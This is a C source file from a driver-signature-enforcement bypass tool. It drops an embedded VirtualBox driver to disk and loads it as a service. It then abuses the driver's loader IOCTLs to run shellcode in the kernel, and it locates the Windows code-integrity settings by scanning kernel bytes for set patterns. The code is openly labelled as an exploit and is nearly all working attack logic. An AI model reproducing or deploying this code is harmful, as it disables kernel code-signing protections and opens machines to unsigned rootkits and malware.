/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       DSEFIX.C
*
*  VERSION:     1.20
*
*  DATE:        14 Mar 2015
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "dsefix.h"
#include "ldasm.h"
#include "vbox.h"
#include "vboxdrv.h"

BOOL dsfControlDSE(
	HANDLE hDevice,
	ULONG_PTR g_CiAddress,
	PVOID scBuffer
	)
{
	BOOL			bRes = FALSE;
	SUPCOOKIE		Cookie;
	SUPLDROPEN		OpenLdr;
	DWORD			bytesIO = 0;
	PVOID			ImageBase = NULL;
	PSUPLDRLOAD		pLoadTask = NULL;
	SUPSETVMFORFAST vmFast;

	//
	//Validate input params
	//
	if (
		(g_CiAddress == 0L) ||
		(scBuffer == NULL)
		)
	{
		return FALSE;
	}

	//
	// Set VBox Cookie.
	//
	RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));

	Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
	Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
	Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
	Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	Cookie.Hdr.rc = 0;
	Cookie.u.In.u32ReqVersion = 0;
	Cookie.u.In.u32MinVersion = 0x00070002;
	_strcpy_a(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC);

	if (!DeviceIoControl(hDevice, SUP_IOCTL_COOKIE, &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
		SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL)) goto fail;

	//
	// Open loader instance.
	//
	RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
	OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
	OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
	OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
	OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
	OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	OpenLdr.Hdr.rc = 0;
	OpenLdr.u.In.cbImage = sizeof(OpenLdr.u.In.szName);
	OpenLdr.u.In.szName[0] = 'a';
	OpenLdr.u.In.szName[1] = 0;

	if (!DeviceIoControl(hDevice, SUP_IOCTL_LDR_OPEN, &OpenLdr,
		SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
		SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO,
		NULL))
	{
		goto fail;
	}

	ImageBase = OpenLdr.u.Out.pvImageBase;

	//
	// Setup load task.
	//
	pLoadTask = (PSUPLDRLOAD)VirtualAlloc(NULL, 0x1000,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (pLoadTask == NULL) goto fail;

	RtlSecureZeroMemory(pLoadTask, 0x1000);
	pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
	pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
	pLoadTask->Hdr.cbIn = 0x88;
	pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
	pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
	pLoadTask->Hdr.rc = 0;
	pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
	pLoadTask->u.In.pvImageBase = (RTR0PTR)ImageBase;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)(ULONG_PTR)0x1000;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = (RTR0PTR)ImageBase;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = (RTR0PTR)ImageBase;
	pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = (RTR0PTR)ImageBase;

	//
	// Copy shellcode, because it always less than pointer size
	// sizeof is OK here.
	//
	memcpy(pLoadTask->u.In.achImage, scBuffer, sizeof(scBuffer));
	pLoadTask->u.In.cbImage = 0x20;

	if (!DeviceIoControl(hDevice, SUP_IOCTL_LDR_LOAD, pLoadTask, 0x88,
		pLoadTask, sizeof(SUPREQHDR), &bytesIO, NULL)) goto fail;

	//
	// Execute exploit.
	//
	vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
	vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
	vmFast.Hdr.rc = 0;
	vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
	vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
	vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
	vmFast.u.In.pVMR0 = (PVOID)(ULONG_PTR)0x1000;

	if (!DeviceIoControl(hDevice, SUP_IOCTL_SET_VM_FOR_FAST, &vmFast,
		SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN, &vmFast,
		SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
	{
		goto fail;
	}

	bRes = DeviceIoControl(hDevice, SUP_IOCTL_FAST_DO_NOP,
		(LPVOID)g_CiAddress, 0, (LPVOID)g_CiAddress, 0, &bytesIO, NULL);

fail:
	if (pLoadTask != NULL) VirtualFree(pLoadTask, 0, MEM_RELEASE);
	if (hDevice != NULL) CloseHandle(hDevice);
	return bRes;
}

LONG dsfQueryCiEnabled(
	PULONG_PTR pKernelBase,
	PVOID MappedKernel,
	DWORD SizeOfImage
	)
{
	ULONG      c;
	LONG       rel = 0;

	//
	// Validate input parameters.
	//
	if (
		(pKernelBase == NULL) ||
		(MappedKernel == NULL) ||
		(SizeOfImage == 0)
		)
	{
		return 0;
	}

	for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
		if (*(PDWORD)((PBYTE)MappedKernel + c) == 0x1d8806eb) {
			rel = *(PLONG)((PBYTE)MappedKernel + c + 4);
			*pKernelBase = *pKernelBase + c + 8 + rel;
			break;
		}
	}

	return rel;
}

LONG dsfQueryCiOptions(
	PULONG_PTR pKernelBase,
	PVOID MappedKernel
	)
{
	PBYTE        CiInit = NULL;
	ULONG        c;
	LONG         rel = 0;
	ldasm_data	 ld;

	//
	// Validate input parameters.
	//
	if (
		(pKernelBase == NULL) ||
		(MappedKernel == NULL)
		)
	{
		return 0;
	}

	CiInit = (PBYTE)GetProcAddress(MappedKernel, "CiInitialize");

	c = 0;
	do {
		/* jmp CipInitialize */
		if (CiInit[c] == 0xE9) {
			rel = *(PLONG)(CiInit + c + 1);
			break;
		}
		c += ldasm(CiInit + c, &ld, 1);
	} while (c < 256);
	CiInit = CiInit + c + 5 + rel;
	c = 0;
	do {
		if (*(PUSHORT)(CiInit + c) == 0x0d89) {
			rel = *(PLONG)(CiInit + c + 2);
			break;
		}
		c += ldasm(CiInit + c, &ld, 1);
	} while (c < 256);
	CiInit = CiInit + c + 6 + rel;
	*pKernelBase = *pKernelBase + CiInit - (PBYTE)MappedKernel;

	return rel;
}

HANDLE dsfLoadVulnerableDriver(
	_In_ LPWSTR lpDriverFileName
	)
{
	HANDLE	hFile;
	HANDLE	hDevice;
	DWORD	bytesIO;

	//
	// Validate input parameter.
	//
	if (lpDriverFileName == NULL) {
		return NULL;
	}

	//
	// Drop our driver file to the disk.
	//
	hFile = CreateFile(lpDriverFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return NULL;
	}
	bytesIO = 0;
	WriteFile(hFile, VBoxDrv, sizeof(VBoxDrv), &bytesIO, NULL);
	CloseHandle(hFile);

	//
	// Check if file dropped OK.
	//
	if (bytesIO != sizeof(VBoxDrv)) {
		return NULL;
	}

	//
	// Open device handle.
	//
	hDevice = NULL;
	if (!scmLoadDeviceDriver(VBoxDrvSvc, lpDriverFileName, &hDevice)) {
		
		// We cannot open device, restore previous file if exist.
		supBackupVBoxDrv(TRUE);	
		return NULL;
	}
	return hDevice;
}

BOOL dsfStartDriver(
	_In_ LPWSTR lpDriverName,
	_Inout_opt_	PHANDLE lphDevice
	)
{
	BOOL		bResult = FALSE;
	SC_HANDLE	schSCManager;

	if (lpDriverName == NULL) {
		return bResult;
	}

	schSCManager = OpenSCManager(NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS
		);
	if (schSCManager) {

		bResult = scmStartDriver(schSCManager, lpDriverName);

		if (bResult) {
			if (lphDevice) {
				scmOpenDevice(lpDriverName, lphDevice);
			}
		}

		CloseServiceHandle(schSCManager);
	}
	return bResult;
}

BOOL dsfStopDriver(
	_In_ LPWSTR lpDriverName
	)
{
	BOOL		bResult = FALSE;
	SC_HANDLE	schSCManager;

	if (lpDriverName == NULL) {
		return bResult;
	}

	schSCManager = OpenSCManager(NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS
		);
	if (schSCManager) {
		bResult = scmStopDriver(schSCManager, lpDriverName);
		CloseServiceHandle(schSCManager);
	}
	return bResult;
}
